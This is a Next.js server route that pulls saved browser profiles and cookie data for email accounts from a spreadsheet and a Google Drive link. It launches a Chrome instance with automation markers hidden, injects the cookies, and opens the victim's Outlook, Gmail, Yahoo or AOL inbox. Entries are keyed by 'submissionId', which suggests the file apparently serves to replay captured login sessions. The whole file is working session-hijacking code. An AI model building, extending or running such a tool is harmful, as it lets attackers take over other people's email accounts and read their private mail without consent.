import { NextResponse } from 'next/server';
import { getSheetDataApi } from '../../api/googlesheets.js';
import { localExecutablePath } from '../../../utils/utils.js';
import puppeteer from 'puppeteer-core';
import fs from 'fs-extra';
import path from 'path';
import https from 'https';
import http from 'http';
import extractZip from 'extract-zip';

export const maxDuration = 300;
export const dynamic = 'force-dynamic';

const PLATFORM_INBOX_URLS = {
  'outlook.com': 'https://outlook.live.com/mail/',
  'hotmail.com': 'https://outlook.live.com/mail/',
  'live.com': 'https://outlook.live.com/mail/',
  'msn.com': 'https://outlook.live.com/mail/',
  'gmail.com': 'https://mail.google.com/mail/',
  'googlemail.com': 'https://mail.google.com/mail/',
  'yahoo.com': 'https://mail.yahoo.com/',
  'aol.com': 'https://mail.aol.com/',
};

const TEST_SESSIONS_DIR = path.resolve('test_sessions');

const getDirectDownloadUrl = (driveUrl) => {
  if (!driveUrl) return null;
  const match = driveUrl.match(/\/file\/d\/([^/]+)/);
  if (!match) return driveUrl;
  return `https://drive.google.com/uc?export=download&id=${match[1]}`;
};

function downloadFile(url, destPath) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const mod = parsed.protocol === 'https:' ? https : http;
    const makeRequest = (targetUrl) => {
      const req = mod.get(targetUrl, (res) => {
        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          makeRequest(res.headers.location);
          return;
        }
        if (res.statusCode !== 200) {
          let body = '';
          res.on('data', (c) => (body += c.toString()));
          res.on('end', () => reject(new Error(`Download failed with status ${res.statusCode}: ${body.slice(0, 200)}`)));
          return;
        }
        const fileStream = fs.createWriteStream(destPath);
        res.pipe(fileStream);
        fileStream.on('finish', () => resolve());
        fileStream.on('error', reject);
      });
      req.on('error', reject);
    };
    makeRequest(url);
  });
}

function listFilesRecursive(dir, prefix = '') {
  const entries = [];
  if (!fs.existsSync(dir)) return entries;
  for (const item of fs.readdirSync(dir)) {
    const fullPath = path.join(dir, item);
    const relPath = prefix ? `${prefix}/${item}` : item;
    if (fs.statSync(fullPath).isDirectory()) {
      entries.push(...listFilesRecursive(fullPath, relPath));
    } else {
      entries.push(relPath);
    }
  }
  return entries;
}

export async function POST(request) {
  let browser = null;
  let browserId = null;

  try {
    const body = await request.json();
    browserId = body.browserId || body.submissionId;

    if (!browserId) {
      return NextResponse.json({ error: 'Missing browserId' }, { status: 400 });
    }

    const cookieResult = await getSheetDataApi('cookie');
    if (!cookieResult.success || cookieResult.count === 0) {
      return NextResponse.json({ error: 'No cookie data available' }, { status: 500 });
    }

    const headers = cookieResult.headers;
    const row = cookieResult.data.find((r) => {
      const idx = headers.indexOf('browserId');
      return idx !== -1 && String(r[idx]).trim() === String(browserId).trim();
    });

    if (!row) {
      return NextResponse.json({ error: 'Session not found' }, { status: 404 });
    }

    const col = (key) => {
      const idx = headers.indexOf(key);
      return idx !== -1 ? row[idx] : null;
    };

    const driveUrl = col('driveUrl');
    const email = col('email') || '';
    const domain = col('domain') || (email ? email.split('@')[1].toLowerCase() : '');

    if (!driveUrl) {
      return NextResponse.json({ error: 'No saved browser profile' }, { status: 404 });
    }

    let cookieJSON = null;
    try {
      const raw = col('cookie') || col('cookieJSON') || col('formattedCookie');
      if (raw) {
        const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (Array.isArray(parsed) && parsed.length > 0) cookieJSON = parsed;
      }
    } catch (_) {}

    const platformUrl = domain ? (PLATFORM_INBOX_URLS[domain] || `https://${domain}`) : '';
    const downloadUrl = getDirectDownloadUrl(driveUrl);

    const destDir = path.join(TEST_SESSIONS_DIR, browserId);
    fs.rmSync(destDir, { recursive: true, force: true });
    fs.mkdirSync(destDir, { recursive: true });

    const zipPath = path.join(TEST_SESSIONS_DIR, `${browserId}.zip`);
    await downloadFile(downloadUrl, zipPath);
    await extractZip(zipPath, { dir: destDir });
    fs.removeSync(zipPath);

    const profileFiles = listFilesRecursive(destDir);

    browser = await puppeteer.launch({
      headless: false,
      executablePath: localExecutablePath,
      ignoreDefaultArgs: ['--enable-automation'],
      args: [
        `--user-data-dir=${destDir}`,
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-sync',
      ],
    });

    const pages = await browser.pages();
    const page = pages[0] || (await browser.newPage());

    if (cookieJSON && cookieJSON.length > 0) {
      console.log(`[test-session] Injecting ${cookieJSON.length} cookies via page.setCookie`);
      await page.setCookie(...cookieJSON.map(c => ({
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path || '/',
        secure: c.secure || false,
        httpOnly: c.httpOnly || false,
        sameSite: c.sameSite || 'Lax',
        ...(c.expires && c.expires > 0 ? { expires: c.expires } : {}),
      })));
    } else {
      console.log(`[test-session] No cookieJSON found — profile-only mode`);
    }

    if (platformUrl) {
      await page.goto(platformUrl, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
    }

    await new Promise((r) => setTimeout(r, 8000));

    const finalUrl = page.url();

    const autoCloseTimer = setTimeout(async () => {
      try {
        if (browser) await browser.close().catch(() => {});
      } catch (_) {}
      fs.removeSync(destDir);
    }, 10 * 60 * 1000);

    return NextResponse.json({
      success: true,
      browserId,
      platformUrl,
      finalUrl,
      domain,
      email,
      cookieCount: cookieJSON ? cookieJSON.length : 0,
      profileFiles,
      message: 'Browser opened with cookie injection. It will auto-close in 10 minutes.',
    });
  } catch (error) {
    if (browser) await browser.close().catch(() => {});
    if (browserId) fs.removeSync(path.join(TEST_SESSIONS_DIR, browserId));
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
